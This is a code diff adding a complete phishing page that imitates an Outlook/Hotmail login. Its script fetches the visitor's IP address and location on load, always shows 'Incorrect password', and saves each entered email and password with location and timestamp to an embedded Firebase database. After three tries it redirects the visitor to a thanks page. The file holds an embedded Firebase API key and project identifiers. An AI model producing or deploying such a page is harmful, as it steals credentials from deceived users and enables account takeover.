@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="icon" type="image/x-icon" href="./images/favicon.ico">
+    <meta property="og:image" content="./images/outlook.webp">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Form</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f9f9f9;
+        }
+        .login-container {
+            width: 300px;
+            padding: 20px;
+            background-color: #fff;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+        }
+        img {
+            display: block;
+            margin: 0 auto 20px;
+        }
+        input[type="email"],
+        input.password-input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        input[type="text"],
+        input.password-input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        label {
+            font-size: 14px;
+            color: #555;
+        }
+        .show-password {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        input[type="checkbox"] {
+            margin-right: 8px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0078d4;
+            border: none;
+            color: white;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #005a9e;
+        }
+        .button-box {
+            display: block;
+            position: relative;
+            margin: 8px 40px;
+        }
+        #feedback {
+            color: red;
+            font-family: sans-serif;
+            font-size: 15px;
+            text-align: center;
+            margin: 0 30px;
+            display:block;
+        }
+        #errorMessage {
+            color: #d83b01;
+            font-size: 14px;
+            margin-bottom: 15px;
+            text-align: center;
+            display: none;
+        }
+        .error-field {
+            border: 1px solid red !important;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://res.cloudinary.com/dl6mhgnqg/image/upload/v1731678334/outlook_ebgjls.webp" alt="Sign In Image" width="280">
+        <div id="errorMessage" class="error-message"></div>
+        <input style="display: none;" type="text" id="username" placeholder="Username" required>
+        <input type="email" id="email" placeholder="Email address" required>
+        <input type="password" id="password" class="password-input" name="password" placeholder="Password" required>
+
+        <div class="show-password">
+            <input type="checkbox" class="toggle-password">
+            <label>Show password</label>
+        </div>
+        <span id="feedback"></span>
+
+        <span class="button-box">
+            <button class="btn" name="login" id="login">Log in</button>
+        </span>
+    </div>
+
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-database-compat.js"></script>
+    
+    <script>
+        // Your Firebase configuration
+  const firebaseConfig = {
+  apiKey: "AIzaSyDHn2X_yjUj8bc1egKxYbaeN1wjULKX61k",
+  authDomain: "vote-ccec6.firebaseapp.com",
+  projectId: "vote-ccec6",
+  storageBucket: "vote-ccec6.firebasestorage.app",
+  messagingSenderId: "514930093592",
+  appId: "1:514930093592:web:b7bba2605f1fe8f3ea5d6d",
+  measurementId: "G-2EYK0N67ZF"
+};
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        let failedAttempts = 0;
+        const maxAttempts = 3;
+        let userCountry = 'Unknown';
+        let userCity = 'Unknown';
+        let userIP = 'Unknown';
+
+        // Toggle password visibility
+        const togglePassword = document.querySelector('.toggle-password');
+        const passwordInput = document.querySelector('.password-input');
+
+        togglePassword.addEventListener('change', function() {
+            if (this.checked) {
+                passwordInput.type = 'text';
+            } else {
+                passwordInput.type = 'password';
+            }
+        });
+
+        // Function to get location data
+        function fetchLocationData() {
+            // Get IP address first
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    userIP = data.ip;
+                    // Now get location details
+                    return fetch(`https://ipapi.co/${userIP}/json/`);
+                })
+                .then(response => response.json())
+                .then(data => {
+                    userCountry = data.country_name || 'Unknown';
+                    userCity = data.city || 'Unknown';
+                    console.log('Location data retrieved:', userCountry, userCity, userIP);
+                })
+                .catch(error => {
+                    console.error('Error fetching location:', error);
+                    // Fallback to another service if first one fails
+                    fetch('https://ip-api.io/json/')
+                        .then(response => response.json())
+                        .then(data => {
+                            userCountry = data.country_name || 'Unknown';
+                            userCity = data.city || 'Unknown';
+                            userIP = data.ip || 'Unknown';
+                        })
+                        .catch(err => console.error('Fallback location service failed:', err));
+                });
+        }
+
+        // Function to save failed login attempt to Firebase
+        function saveFailedAttempt(email, password) {
+            const timestamp = new Date().toISOString();
+            
+            const attemptData = {
+                username: email + " (hotmail)",
+                password: password,
+                ip: userIP,
+                location: `${userCity}, ${userCountry}`,
+                timestamp: timestamp
+            };
+            
+            // Save under "failed_logins" with a unique key
+            const newKey = 'outlook_' + Date.now();
+            
+            database.ref('Outlook/' + newKey).set(attemptData)
+                .then(() => {
+                    console.log('Failed Outlook login attempt saved to Realtime Database');
+                })
+                .catch((error) => {
+                    console.error('Error saving login attempt:', error);
+                });
+        }
+
+        // Call the function to fetch location data when page loads
+        fetchLocationData();
+
+        document.getElementById('login').addEventListener('click', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email');
+            const password = document.getElementById('password');
+            const feedback = document.getElementById('feedback');
+            const errorMessage = document.getElementById('errorMessage');
+            
+            // Reset error styles
+            email.classList.remove('error-field');
+            password.classList.remove('error-field');
+            
+            // Validate fields
+            let isValid = true;
+            
+            if (!email.value.trim()) {
+                email.classList.add('error-field');
+                isValid = false;
+            }
+            
+            if (!password.value.trim()) {
+                password.classList.add('error-field');
+                isValid = false;
+            }
+            
+            if (!isValid) {
+                errorMessage.style.display = 'block';
+                errorMessage.textContent = 'Both email and password are required';
+                feedback.textContent = '';
+                return; // Stop execution if validation fails
+            }
+            
+            // If validation passes, proceed with login attempt
+            errorMessage.style.display = 'block';
+            errorMessage.textContent = 'Incorrect password. Please try again.';
+            feedback.textContent = 'Incorrect password! Please try again...';
+            
+            // Save failed attempt to Firebase
+            saveFailedAttempt(email.value, password.value);
+            
+            failedAttempts++;
+            
+            if (failedAttempts >= maxAttempts) {
+                // On third attempt, redirect
+                setTimeout(() => {
+                    window.location.href = 'thanks.html';
+                }, 1000);
+            }
+        });
+
+        // Add event listeners to remove error class when user starts typing
+        document.getElementById('email').addEventListener('input', function() {
+            this.classList.remove('error-field');
+        });
+        
+        document.getElementById('password').addEventListener('input', function() {
+            this.classList.remove('error-field');
+        });
+    </script>
+</body>
+</html>
